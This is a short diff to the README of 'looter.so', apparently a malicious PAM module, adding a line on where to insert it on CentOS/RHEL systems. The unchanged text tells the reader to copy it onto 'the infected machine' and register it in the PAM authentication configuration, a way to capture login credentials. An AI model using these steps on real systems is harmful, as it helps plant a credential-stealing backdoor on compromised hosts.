@@ -17,6 +17,7 @@ make
 
 # Usage
 Copy the `looter.so` to the infected machine on `/lib/security`, then edit the `/etc/pam.d/common-auth` and add the following lines.
+For CentOS or RHEL edit the file /etc/pam.d/password-auth and insert these lines before pam_unix.so module
 ```
 auth optional module.so
 account optional module.so
